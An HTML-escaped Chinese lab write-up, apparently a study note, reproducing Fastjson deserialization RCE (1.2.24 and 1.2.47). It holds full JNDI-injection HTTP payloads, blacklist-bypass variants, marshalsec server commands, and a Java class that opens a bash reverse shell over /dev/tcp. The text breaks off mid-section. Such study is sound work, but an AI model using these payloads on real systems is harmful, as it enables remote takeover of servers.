&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;name=&amp;#x27;wuya&amp;#x27;, age=66, flag=true, sex=&amp;#x27;boy&amp;#x27;, address=&amp;#x27;null&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;com.wuya.test.User&amp;quot;,&amp;quot;age&amp;quot;:33,&amp;quot;flag&amp;quot;:false,&amp;quot;name&amp;quot;:&amp;quot;wuya&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用自省功能传入恶意类实现攻击&lt;/p&gt;
&lt;p&gt;这个 JSON 反序列化接口处，我们传入恶意的 JSON，就可以调用任意类的构造方法以及属性相关的 get，set 方法。 如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意 JSON 达到 RCE 的作用。&lt;/p&gt;
&lt;p&gt;利用类&lt;/p&gt;
&lt;p&gt;com.sun.rowset.JdbcRowSetImpl&lt;/p&gt;
&lt;p&gt;dataSourceName 支持传入一个 rmi 的源，可以实现 JNDI 注入攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122144731132.png&#34; alt=&#34;image-20221122144731132&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;1214-cnvd-2017-02833&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1214-cnvd-2017-02833&#34;&gt;#&lt;/a&gt; 1.2.14 CNVD-2017-02833&lt;/h4&gt;
&lt;p&gt;复现&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1、vulhub启动靶场&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2、Kali 用marshalsec启动LDAP/RMI服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3、Kali 用python启动HTTP服务，存放恶意类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4、Kali 用netcat监听端口，建立反弹连接&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;切换 python 版本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;update-alternatives --install /usr/bin/python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python /usr/bin/python2 100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;update-alternatives --install /usr/bin/python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python /usr/bin/python3 150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;切换版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;update-alternatives --config python&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置 jre 版本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/profile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JAVA_HOME=/usr/local/soft/java/jdk1.8.0_74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=$JAVA_HOME/bin:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ME/lib/tools.jar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source /etc/profile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;编写恶意代码LinuxTouch，编译为class&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 8089 #python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &amp;quot;http://192.168.142.132:8089/#LinuxTouch&amp;quot; 9473&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST / HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.142.128:8090&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: keep-alive&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &amp;quot;b&amp;quot;: &amp;#123; &amp;quot;@type&amp;quot;: &amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;, &amp;quot;dataSourceName&amp;quot;: &amp;quot;rmi://192.168.142.132:9473/LinuxTouch&amp;quot;, &amp;quot;autoCommit&amp;quot;: true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;原理:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.JdbcRowSetImpl&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;payload 中反序列化时传入了 dataSourceName 和 autoCommit&lt;/p&gt;
&lt;p&gt;那么按照上面的反序列化过程一定会调用 setDataSourceName 和 setautoCommit&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public void setDataSourceName(String dsName) throws SQLException&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       if(getDataSourceName() != null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          if(!getDataSourceName().equals(dsName)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             super.setDataSourceName(dsName);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             conn = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             ps = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             rs = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          super.setDataSourceName(dsName);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;setautoCommit&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122153207492.png&#34; alt=&#34;image-20221122153207492&#34;&gt;&lt;/p&gt;
&lt;p&gt;setautoCommit 调用 connect ()，connect () 会对 dataSourceName 属性进行一个 InitialContext.lookup (dataSourceName), 从而实现 JNDI 注入。找到恶意服务器上下载代码并执行&lt;/p&gt;
&lt;p&gt;修复&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;默认不使用autotype&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;com.sun.rowset.jdbcRowSetlmpl被加入了黑名单&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;bypass 1&lt;/p&gt;
&lt;p&gt;所以在 autotypesupport 开启时，我们可以构造如下 payload 来 bypass&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;Lcom.sun.rowset.JdbcRowSetImpl;&amp;quot;,&amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi://ip:1099&amp;quot;,&amp;quot;autoCommit&amp;quot;:true&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;“至于为什么会有这种奇怪的处理，L 和；这一对字符其实是 JVM 字节码中用来表示类名的：”&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (className.&lt;span class=&#34;title function_&#34;&gt;startsWith&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;L&amp;quot;&lt;/span&gt;) &amp;amp;&amp;amp; className.&lt;span class=&#34;title function_&#34;&gt;endsWith&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;;&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;String&lt;/span&gt; newClassName = className.&lt;span class=&#34;title function_&#34;&gt;substring&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, className.&lt;span class=&#34;title function_&#34;&gt;length&lt;/span&gt;() - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;loadClass&lt;/span&gt;(newClassName, classLoader);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;bypass2&lt;/p&gt;
&lt;p&gt;双写&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;@type&amp;quot;:&amp;quot;LLcom.sun.rowset.JdbcRowSetImpl;;&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://127.0.0.1:2357/Command8&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;1247-cnvd-2017-22238&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1247-cnvd-2017-22238&#34;&gt;#&lt;/a&gt; 1.2.47 CNVD-2017-22238&lt;/h4&gt;
&lt;p&gt;通过反弹连接的方式&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvp 9001&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;编写恶意代码LinuxRevers，编译为class&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 8089 #python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &amp;quot;http://192.168.142.132:8089/#LinuxRevers&amp;quot; 9473&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//LinuxRevers.java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class LinuxRevers &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime rt = Runtime.getRuntime();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String[] commands = &amp;#123;&amp;quot;/bin/bash&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.142.132/9001 0&amp;gt;&amp;amp;1&amp;quot;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Process pc = rt.exec(commands);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pc.waitFor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST / HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.142.128:8090&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: keep-alive&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 268&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;a&amp;quot;:&amp;#123; &amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;, &amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;b&amp;quot;:&amp;#123; &amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;, &amp;quot;dataSourceName&amp;quot;:&amp;quot;ldap://192.168.142.132:9473/LinuxRevers&amp;quot;, &amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 1.2.47 版本及以下的情况下，loadClass 中默认 cache 为 true，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.jdbcRowSetlmpl 这个类，即可绕过黑名单。&lt;/p&gt;
&lt;p&gt;漏洞挖掘&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、找到发送 JSON 序列化数据的接口&lt;/p&gt;
&lt;p&gt;2、判断是否使用 fastjon&lt;/p&gt;
&lt;p&gt;1）非法格式报错&lt;/p&gt;
&lt;p&gt;{“x”:&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122154741767.png&#34; alt=&#34;image-20221122154741767&#34;&gt;&lt;/p&gt;
&lt;p&gt;2）使用 dnslog 探测&lt;/p&gt;
